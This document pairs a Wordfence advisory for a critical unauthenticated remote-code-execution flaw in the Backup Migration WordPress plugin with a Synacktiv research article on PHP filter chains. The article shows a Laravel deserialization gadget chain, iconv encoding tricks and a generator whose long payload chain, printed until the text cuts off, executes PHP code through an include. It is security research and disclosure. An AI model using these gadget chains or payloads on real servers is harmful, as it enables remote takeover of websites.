 [Wordfence Intelligence](https://www.wordfence.com/threat-intel)   >    [Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities)   >   Backup Migration <= 1.3.7 - Unauthenticated Remote Code Execution

9.8

**Improper Control of Generation of Code ('Code Injection')**
**CVSS Vector**
[CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

| CVE | [CVE-2023-6553](https://www.cve.org/CVERecord?id=CVE-2023-6553) |
| --- | --- |
| CVSS | 9.8 (Critical) |
| Publicly Published | December 11, 2023 |
| Last Updated | January 22, 2024 |
| Researcher | [Nex Team](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/nex-team) |

### Description

The Backup Migration plugin for WordPress is vulnerable to Remote Code Execution in all versions up to, and including, 1.3.7 via the /includes/backup-heart.php file. This is due to an attacker being able to control the values passed to an include, and subsequently leverage that to achieve remote code execution. This makes it possible for unauthenticated attackers to easily execute code on the server.

#### References

* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/backup-backup/tags/1.3.7/includes/backup-heart.php#L38)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/backup-backup/tags/1.3.7/includes/backup-heart.php#L62)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/backup-backup/tags/1.3.7/includes/backup-heart.php#L64)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/backup-backup/tags/1.3.7/includes/backup-heart.php#L118)
* [www.synacktiv.com](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=3006541%40backup-backup&new=3006541%40backup-backup&sfp_email=&sfph_mail=)

#### Share

[Facebook](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fbackup-backup%2Fbackup-migration-137-unauthenticated-remote-code-execution&t=Backup%20Migration%20%3C%3D%201.3.7%20-%20Unauthenticated%20Remote%20Code%20Execution "Facebook")
[Twitter](https://twitter.com/share?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fbackup-backup%2Fbackup-migration-137-unauthenticated-remote-code-execution&text=Backup%20Migration%20%3C%3D%201.3.7%20-%20Unauthenticated%20Remote%20Code%20Execution "Twitter")
[LinkedIn](https://www.linkedin.com/shareArticle?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fbackup-backup%2Fbackup-migration-137-unauthenticated-remote-code-execution "LinkedIn")
Email

## Vulnerability Details for Backup Migration

#### [Backup Migration](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/backup-backup)

| Software Type | Plugin |
| --- | --- |
| Software Slug | backup-backup [(view on wordpress.org)](https://wordpress.org/plugins/backup-backup) |
| Patched? | Yes |
| Remediation | Update to version 1.3.8, or a newer patched version |
| Affected Version | * <= 1.3.7 |
| Patched Version | * 1.3.8 |

This record contains material that is subject to copyright.

**Copyright 2012-2025 Defiant Inc.**

**License:**
Defiant hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute this software vulnerability information. Any copy of the software vulnerability information you make for such purposes is authorized provided that you include a hyperlink to this vulnerability record and reproduce Defiant's copyright designation and this license in any such copy.
**[Read more.](https://www.wordfence.com/wordfence-intelligence-terms-and-conditions/)**

**Copyright 1999-2025 The MITRE Corporation**

**License:**
CVE Usage: MITRE hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute Common Vulnerabilities and Exposures (CVE®). Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy.
**[Read more.](https://www.cve.org/Legal/TermsOfUse)**

Have information to add, or spot any errors? Contact us at wfi-support@wordfence.com so we can make any appropriate adjustments.

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation



=== Content from www.synacktiv.com_9744edb5_20250114_212959.html ===

[Skip to main content](php-filters-chain-what-is-it-and-how-to-use-it#main-content)
 [Search](../../search)
Switch Language

ENToggle Dropdown

* EN
* [FR](../../publications/php-filters-chain-what-is-it-and-how-to-use-it)

* [RSS](/en/feed/lastblog.xml)
* [Github](https://github.com/Synacktiv)
* [Twitter](https://twitter.com/synacktiv)
* [Linkedin](https://fr.linkedin.com/company/synacktiv)

[![Home](../../sites/default/files/logo_synacktiv_blanc.png)](../../en "Home")

* [Our offer](../our-offer)
  + [Penetration Test / Red Team](../features/penetration-test-red-team)
  + [Incident response](../features/incident-response)
  + [Trainings](../offers/trainings)
  + [Reverse-engineering](../features/reverse-engineering)
  + [Development](../our-team/development)
  + [Products](../products/kraqozorus)
  + [CSIRT](../csirt)
* [Join us](../join-us)
* [Publications](../our-publications)
  + [Posts](../publications)
  + [Advisories](../advisories)
  + [Resources](../ressources)
* [The company](../the-company)
* [Contact](../contact)

* [RSS](/en/feed/lastblog.xml)
* [Github](https://github.com/Synacktiv)
* [Twitter](https://twitter.com/synacktiv)
* [Linkedin](https://fr.linkedin.com/company/synacktiv)

# PHP filters chain: What is it and how to use it

Written by
RÃ©mi Matasse
- 18/10/2022 - in
Pentest
- [Download](php-filters-chain-what-is-it-and-how-to-use-it)

Searching for new gadget chains to exploit deserialization vulnerabilities can be tedious. In this article we will explain how to combine a recently discovered technique called PHP filters [LOKNOP-GIST], to transform file inclusion primitives in PHP applications to remote code execution. To support our explanations we will rely on a Laravel file inclusion gadget chains that was discovered during this research.

# How it began

## Research on POP chains

It all started from research on gadgets chains to improve code analysis skills on PHP. We first began with one of my favorite framework: *Symfony*. Unfortunately, the task was harder than expected since most of the potentially interesting objects are protected by the following mechanism:

```

<?php

class RandomClassThatSeemedPromising {
    [...]
    public function __wakeup()
    {
        throw new \BadMethodCallException('Cannot unserialize '.__CLASS__);
    }

    public function __destruct(){
        //cool stuff that seemed exploitable
    }

}
```

Since the `__wakeup` method is automatically called when unserializing,Â  a `BadMethodCallException` will be thrown and the `__destruct` method will never be executed.

![Looking for symfony POP chain be like.](../../sites/default/files/inline-images/research_symfony.png)

After some time finding literally nothing, we tried to have a look at another common PHP framework: *Laravel*.

## File include chain on Laravel framework

The researches were far quicker to show results on *Laravel*. A working file inclusion POP chain was found in a few hours on the `laravel/framework` v9.34.0 package. While *Laravel's* developers were contacted regarding this issue, they do not intend to fix the gadget chain because, according to them, the issue lies in the use of `unserialize()` on untrusted user inputs.

![File read gadget laravel/framework 9.34.0.](../../sites/default/files/inline-images/laravel_gadget_incomplete.png)

File include gadget chain on laravel/framework 9.34.0.

PHP unserialization will not be covered here since there are already several good resources on the subject, such as this one: [**[OWASP-POP-chain]**](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection).

The chain we found works as follows:

* inÂ `src/Illuminate/Routing/PendingResourceRegistration.php`

```

<?php

namespace Illuminate\Routing;

use Illuminate\Support\Arr;
use Illuminate\Support\Traits\Macroable;

class PendingResourceRegistration
{
        $this->name = $name;
        $this->options = $options;
        $this->registrar = $registrar;
        $this->controller = $controller;
[...]

    public function register()
    {
        $this->registered = true;

        return $this->registrar->register(
            $this->name, $this->controller, $this->options
        );
    }
[...]
    public function __destruct()
    {
        if (! $this->registered) {
            $this->register();
        }
    }
}
```

When the `__destruct()` function is called, if the `$this->registered` value is not defined, the execution flow first goes to theÂ `PendingResourceRegistration` object's `register` function. The latter then calls the `register` function of another object which can be arbitrarily defined.

All there is to do from this point is to find another object defining a `register` function in *Laravel* packages. Because PHP is a weakly typed language, we can set the value of the registrar attribute to any other object.

Additionally, if a method is called with more parameters than its prototype, the extra parameters will be ignored. This means we can call any register methods from any *Laravel* object with zero to three parameters.

* in `src/Illuminate/Routing/RouteFileRegistrar.php`

```

<?php

namespace Illuminate\Routing;

class RouteFileRegistrar
{
    protected $router;
[...]
    public function register($routes)
    {
        $router = $this->router;

        require $routes;
    }
}
```

The `RouteFileRegistrar` class has a register method with one argument and, icing on the cake, there is a permissive `require` function in which we entirely control the parameter `$routes`.

From this point, we have a local file inclusion on the latest *Laravel* version. This is however not sufficient compared to the multiple already existing ways to get code execution via unserialization on Laravel as shows the *phpggc* available pop chains list.

![laravel pop chains list phpggc](../../sites/default/files/inline-images/Laravel_chains.png)

*Laravel* pop chains list on *phpggc*.

After digging for a while to try and transform this file inclusion primitive to a remote code execution, we were advised by a colleague (@LoadLow) to take a look at PHP filter chains. A pretty good write-up by *loknop* on the subject can be found here: **[[LOKNOP-GIST]](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)**. The exploitation described in the article is not versatile since it missed many possible payloads, but from this point, we wanted to find a way to adapt it to our situation.

# PHP filters to the rescue

Around the world, there are nearly 7000 spoken languages. In order to allow most people on Earth to benefit from the internet and to communicate with each other, many printable characters have to be enabled. We all know our basic ASCII encoding table, but it is far too small to speak in Japanese, or even in Greek which contains characters such as 'Î»', 'Î½', 'Ï'. Thus, to be able to print characters from other languages, or even emojis, âº, many encoding tables were created to convert or even translit characters from one language to another when possible.

All these examples are only linked to languages spoken by humans ! Many RFCs were designed for other protocols to make characters interpretable on older systems.

On Linux, you can enumerate the conversion table aliases through the `iconv -l` command.

```

$ iconv -l
The following list contains all the coded character sets known.  This does
not necessarily mean that all combinations of these names can be used for
the FROM and TO command line parameters.  One coded character set can be
listed with several different names (aliases).

  437, 500, 500V1, 850, 851, 852, 855, 856, 857[...]
```

These conversion tables are also accessible through `php://convert.iconv.*.*` wrappers: [**[PHP-DOC-WRAPPER-CONVERT-ICONV]**](https://www.php.net/manual/en/filters.convert.php#filters.convert.iconv).

> The *`convert.iconv.*`* filters are available, if iconv support is enabled, and their use is equivalent to processing all stream data with iconv(). These filters do not support parameters, but instead expect the input and output encodings to be given as part of the filter name, i.e. either as *`convert.iconv.<input-encoding>.<output-encoding>`* or *`convert.iconv.<input-encoding>/<output-encoding>`* (both notations are semantically equivalent).

This wrapper makes the link between the wrapper and the PHP function `iconv`Â [**[PHP-DOC-ICONV-FUNC]**](https://www.php.net/manual/fr/function.iconv.php).

This exploitation trick was first detailed on a CTF write-up who referenced another article from *gynvael* [**[GYNVAEL-BLOGPOST]**](https://gynvael.coldwind.pl/?id=671) using PHP wrappers for other purposes in 2018. The trick is not new, but it only began to be democratized around the end of 2021.

## Dig further, how does it work

It is possible to transform many characters from a string by using different encodings through `iconv`, but it is mandatory to control the generated data. We can answer both problematics using base64.

### Controlling the generated data

To be able to strip junk characters, the way `base64decode` works on PHP is quite interesting.

```

$ php -r "echo base64_encode('base64');"
YmFzZTY0

$ php -r "echo base64_decode('YmFzZTY0');"
base64

$ php -r "echo base64_decode('@_>YmFzZTY0');"
base64

$ echo '@_>YmFzZTY0' > test.txt

$ php -r "echo file_get_contents('php://filter/convert.base64-decode/resource=test.txt');"
base64
```

On the above example, the "*base64*" string is base64-encoded, then decoded. The interesting part is when we prepend the "*@\_>*"Â string to our base64 value. As you can see, PHP does not throw errors, but simply ignores them and works as if they did not exist ! This behavior is pure gold in our case since it allows us to filtrate valid characters.

Even if the PHP `base64-decode` filter and `base64_decode` function are really close in their behavior, there is a difference between them regarding the way the '='Â character is interpreted.

```

$ echo 'YmFzZTY0' > test.txt

$ php -r "echo file_get_contents('php://filter/convert.base64-decode/resource=test.txt');"
base64

$ php -r "echo base64_decode('YmFzZ==TY0');"
base64

$ echo 'YmFzZ==TY0' > test.txt

$ php -r "echo file_get_contents('php://filter/convert.base64-decode/resource=test.txt');"

Warning: file_get_contents(): stream filter (convert.base64-decode): invalid byte sequence in Command line code on line 1

$ echo 'YmFzZTY0==' > test.txt

$ php -r "echo file_get_contents('php://filter/convert.base64-decode/resource=test.txt');"

Warning: file_get_contents(): stream filter (convert.base64-decode): invalid byte sequence in Command line code on line 1
```

As we can see, for some reason, the `base64-decode` filter does not properly handle equal signs well compared to the default `base64_decode` PHP function. To solve this problem, it is also required to get rid of equal signs. One of the solutions is to use the UTF7 encoding, which transforms equal signs into other characters that do not bother the `base64-decode` filter.

```

$ php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.UTF7/convert.base64-decode/resource=test.txt');"
base64ï¿½ï¿½ï¿½
```
### Prepend characters

Now that we can filtrate valid characters from junk, let's discuss the heart of this trick: prepended characters from encoding! And somebody might ask "why the hell would an encoding add characters ?". To answer this question we must dig a little in some character encoding RFCs, because indeed, some of them actually prepend characters in an attended way.

#### Unicode encoding

In some cases, signatures are prepended by encoding. In the case of Unicode (UTF-16), it is required to give to your system the order of the bytes to use (Byte Order Mark BOM), by digging a bit in the RFC 2781 referring to it [**[RFC-2781]**](https://www.rfc-editor.org/rfc/rfc2781#section-3.2)

> ```
>
> The Unicode Standard and ISO 10646 define the character "ZERO WIDTH
> NON-BREAKING SPACE" (0xFEFF), which is also known informally as "BYTE
> ORDER MARK" (abbreviated "BOM").This usage, suggested by Unicode
> and ISO 10646 Annex F (informative), is to prepend a 0xFEFF character
> to a stream of Unicode characters as a "signature"; a receiver of such
> a serialized stream may then use the initial character both as a hint
> that the stream consists of Unicode characters and as a way to recognize
> the serialization order.
> In serialized UTF-16 prepended with such a signature, the order is
> big-endian if the first two octets are 0xFE followed by 0xFF; if they
> are 0xFF followed by 0xFE, the order is little-endian. Note that
> 0xFFFE is not a Unicode character, precisely to preserve the
> usefulness of 0xFEFF as a byte-order mark.
> ```

This is just an example of why a character might be prepended to a string depending on the encoding used.

#### Korean Character encoding for Internet Messages

The Korean Character encoding for Internet Messages (ISO-2022-KR) is detailed by the following RFC: [**[RFC-1557]**](https://www.rfc-editor.org/rfc/rfc1557.html).

> ```
>
> It is assumed that the starting code of the message is ASCII.  ASCII
>    and Korean characters can be distinguished by use of the shift
>    function.  For example, the code SO will alert us that the upcoming
>    bytes will be a Korean character as defined in KSC 5601.  To return
>    to ASCII the SI code is used.
>
>    Therefore, the escape sequence, shift function and character set used
>    in a message are as follows:
>
>            SO           KSC 5601
>            SI           ASCII
>            ESC $ ) C    Appears once in the beginning of a line
>                             before any appearance of SO characters.
> ```

Basically, it means that to be considered as ISO-2022-KR, a message has to start with the sequence "*ESC $ ) C*".

This encoding is one of the 7-bitÂ ISO 2022 code versions along with ISO-2022-CN, ISO-2022-CN-EXT, ISO-2022-JP, ISO-2022-JP-1, ISO-2022-JP-2. However, In this encoding list, ISO-2022-KR is the only one prepending characters with the `iconv` PHP function.

```

<?php

$iso_2022_7bits_encodings = array('ISO-2022-CN', 'ISO-2022-CN-EXT', 'ISO-2022-JP', 'ISO-2022-JP', 'ISO-2022-JP-2', 'ISO-2022-KR');

foreach ($iso_2022_7bits_encodings as $elem){
	echo "[$elem] : hex [";
	echo bin2hex(iconv('UTF8',$elem, 'START'))."]\n";
}
```
```

$ php iso_2022_7bits_encodings.php
[ISO-2022-CN] : hex [5354415254]
[ISO-2022-CN-EXT] : hex [5354415254]
[ISO-2022-JP] : hex [5354415254]
[ISO-2022-JP] : hex [5354415254]
[ISO-2022-JP-2] : hex [5354415254]
[ISO-2022-KR] : hex [1b2429435354415254]
```
#### Encodings usable to prepend characters

The following table recaps what was discussed on ISO/IEC 2022 and Unicode encodings. Those will prepend characters without breaking the integrity of a base64 string, making them usable in PHP filter chains.

| Encoding identifier | Prepended characters |
| --- | --- |
| ISO2022KR | \x1b$)C |
| UTF16 | \xff\xfe |
| UTF32 | \xff\xfe\x00\x00 |

## Transform them and get what you want

The last part of our encoding trip is quite obvious. We just demonstrated that prepending character by reading a file is feasible. Now wouldn't it be great to be able to prepend arbitrary characters ? This can be achieved by chaining conversion filters.

### Example: prepend 8 to your chain

Each conversion alias is directly linked to a table containing the printable characters linked to it. We aim to jump from a table to another to get a specific character. In order to prepend an 8 we will require theÂ  iso8859-10 (covering Scandinavian languages) and UNICODE tables.

Iso8859-10 table (Latin 6)
| Â | x0 | x1 | x2 | x3 | x4 | x5 | x6 | x7 | x8 | x9 | xA | xB | xC | xD | xE | xF |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 0x | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â |
| 1x | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â |
| 2x | SP | ! | " | # | $ | % | & | ' | ( | ) | \* | + | , | - | . | / |
| 3x | 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | : | ; | < | = | > | ? |
| 4x | @ | A | B | C | D | E | F | G | H | I | J | K | L | M | N | O |
| 5x | P | Q | R | S | T | U | V | W | X | Y | Z | [ | \ | ] | ^ | \_ |
| 6x | ` | a | b | c | d | e | f | g | h | i | j | k | l | m | n | o |
| 7x | p | q | r | s | t | u | v | w | x | y | z | { | | | } | ~ | Â |
| 8x | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â |
| 9x | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â |
| Ax | NBSP | Ä | Ä | Ä¢ | Äª | Ä¨ | Ä¶ | Â§ | Ä» | Ä | Å | Å¦ | Å½ | SHY | Åª | Å |
| Bx | Â° | Ä | Ä | Ä£ | Ä« | Ä© | Ä· | Â· | Ä¼ | Ä | Å¡ | Å§ | Å¾ | â | Å« | Å |
| Cx | Ä | Ã | Ã | Ã | Ã | Ã | Ã | Ä® | Ä | Ã | Ä | Ã | Ä | Ã | Ã | Ã |
| Dx | Ã | Å | Å | Ã | Ã | Ã | Ã | Å¨ | Ã | Å² | Ã | Ã | Ã | Ã | Ã | Ã |
| Ex | Ä | Ã¡ | Ã¢ | Ã£ | Ã¤ | Ã¥ | Ã¦ | Ä¯ | Ä | Ã© | Ä | Ã« | Ä | Ã­ | Ã® | Ã¯ |
| Fx | Ã° | Å | Å | Ã³ | Ã´ | Ãµ | Ã¶ | Å© | Ã¸ | Å³ | Ãº | Ã» | Ã¼ | Ã½ | **Ã¾** | **Ä¸** |

Â

Part of UNICODE table (UTF 16)
| Â | x00 | x01 | x02 | ... | x35 | x36 | x37 | x38 | ... |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 00x | NUL | SOH | STX | Â | 5 | 6 | 7 | 8 | Â |
| ... | Â | Â | Â | Â | Â | Â | Â | Â | Â |
| 01x | Ä | Ä | Ä | Â | Äµ | Ä¶ | Ä· | **Ä¸** | / |
| ... | Â | Â | Â | Â | Â | Â | Â | Â | Â |

The theory has now been detailed, let's see how it works concretely with a short example.

![Prepend 8 to a string](../../sites/default/files/inline-images/prepend_character8.png)

Prepend 8 to a string using different encodings.

As illustrated above, prepending an 8 can be achieved in 3 steps:

* Convert a string to UTF16 to prepend '*\xff\xfe*'
* Convert the created string to latin6, *'\xff*' is equivalent to the latin character kra 'Ä¸'
* Convert the string back to UTF16 where the character 'Ä¸' is equivalent to *'\x01\x38*'
* Finally, the chain will be interpreted character by character when printed, so '*\x38*' becomes *'8*'

Â

```

<?php
$return = iconv( 'UTF8', 'UTF16', "START");
echo(bin2hex($return)."\n");
echo($return."\n");
$return2 = iconv( 'LATIN6', 'UTF16', $return);
echo(bin2hex($return2)."\n");
echo($return2."\n");
```

Â

```

$ php prepend8.php
fffe53005400410052005400
ï¿½ï¿½START
fffe3801fe005300000054000000410000005200000054000000
ï¿½ï¿½8ï¿½START
```
### What you don't want

Now let's discuss the difficulties encountered when trying to prepend arbitrary characters.

The first tries to generate other base64 characters after discovering this method were based on a script found on Hacktricks [**[HACKTRICKS-LFI2RCE-FILTERS]**](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters#improvements). This script will basically brute-force any common iconv table identifier randomly and see if the prepended character is one of the 64 required. But this script did not check if the integrity of other characters from the initial string was preserved or not.

On Hacktricks, there is a list of brute forced characters which seems promising, but it just cannot work on a full chain and the reason is quite interesting! Let's illustrate with this chain by prepending a 'b' to a string:

```

conversions = {
[...]
 'b': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1399.UCS4',
[...]
}

```

As we can see, the CP1399 codec is used, which is an alias to one of the Japanese version of the Extended Binary Coded Decimal Interchange Code (EBCDIC). It is used as a conversion table on this chain (really close to the IBM 1027 codec). This encoding was used on IBM systems. However, according to the Wikipedia page [**[EBCDIC-WIKI]**](https://en.wikipedia.org/wiki/EBCDIC), there were compatibility issues between EBCDIC and ASCII. Indeed, as we can see in the following table, the hex value 42 is not the character 'B', but ï½¡ in EBCDIC.

IBM 1027
| Â | x0 | x1 | x2 | x3 | x4 | x5 | x6 | x7 | x8 | x9 | xA | xB | xC | xD | xE | xF |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| [...] | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â |
| 4x | SP | Â | ï½¡ | ï½¢ | ï½£ | ï½¤ | ï½¥ | ï½¦ | ï½§ | ï½¨ | Â¢ | . | < | ( | + | | |
| 5x | & | ï½© | ï½ª | ï½« | ï½¬ | ï½­ | ï½® | ï½¯ | ï½° | ï½± | ! | $ | \* | ) | ; | Â¬ |
| 6x | - | / | ï½² | ï½³ | ï½´ | ï½µ | ï½¶ | ï½· | ï½¸ | ï½¹ | Â | , | % | \_ | > | ? |
| [...] | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â | Â |

While this can seem meaningless, let's see what happens step by step on our START string when we try to prepend 'b' to it by following the filters.

![prepend character b chain breaks integrity](../../sites/default/files/inline-images/prepend_characterb_not_working.png)

Breaking a string integrity while prepending 'b'.

The UCS4 codec was not detailed here because it is really close to UTF32. It will only prepend null bytes on each character.

```

<?php
$return = iconv( 'UTF8', 'CSISO2022KR',"START");
echo(bin2hex($return)."\n");
echo($return."\n");
$return2 = iconv( 'CP1399', 'UTF8',$return);
echo(bin2hex($return2)."\n");
echo($return2."\n");
$return3 = iconv( 'UTF8', 'UCS4', $return2);
echo(bin2hex($return3)."\n");
echo($return3."\n");
```
```

php test.php
1b2429435354415254
START
c28fc284c289efbda2efbdabefbdac1aefbdaaefbdac

	ï½¢ï½«ï½¬ï¿½ï½ªï½¬
0000008f00000084000000890000ff620000ff6b0000ff6c0000001a0000ff6a0000ff6c
ï¿½ï¿½ï¿½ï¿½bï¿½kï¿½lï¿½ï¿½jï¿½l
```

So the character 'b' is successfully prepended, but the content is also changed, including the content you already have generated. The string START was transformed during the process. This basically means this filter chain would destroy any character you created before this one.

Following this logic, even if CSISO2022KR seems promising, it is not really that useful. It prepends the chain '*\x1b$)C*' and because 'C' is one of the 64 characters of base64, if one of your chains uses this encoding, and you prepend something else than a 'C', it means your filter chain won't be stable.

Honestly this part of the blogpost was the hardest one to write. We really wanted to focus on a full analysis of an unstable chain is to fully understand what works or not. IBM codecs are various, each of them do things their way, and understanding how they convert a string to UTF8 is again another story. Some tables are close to each other with only a few characters being different, so building a chain from one to another can quickly take a large amount of time.

### Patching a main issue: the requirement of a valid file path

One of the main issues this trick had was the requirement of knowing a valid file path to include/require on the PHP wrapper. This is no longer the case because PHP wrappers allow to nest one to another!

```

$ php -r "echo require('php://filter/convert.base64-decode/resource=php://temp');"
1
```

By using the PHP wrapper `php://temp` as the input resource of the whole filters chain, it is no longer necessary to guess a valid path on the target's file system, which depends on the operating system. It also won't be necessary to guess a path that is allowed by `open_basedir` directives.

### Combining all together in a script

Using the elements we discovered so far we created a script to automatically generate valid filter-chains. This script was heavily inspired by two resources: [**[WUPCO-GITHUB-REPO]**](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT), [**[LOKNOP-GIST]**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) and was completed with additional and smaller brute-forced chains. Every generatedÂ character has been tested to ensure the integrity of the chains was intact while chaining the filters.

It basically transforms a string to a valid PHP filter chain. For example the following chain will trigger the code `<?php phpinfo();Â  ?>`  on a `require` or `include`.

```

$ python3 php_filter_chain_generator.py --chain '<?php phpinfo();  ?> '
[+] The following gadget chain will generate the following code : <?php phpinfo();  ?>  (base64 value: PD9waHAgcGhwaW5mbygpOyAgPz4g)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SH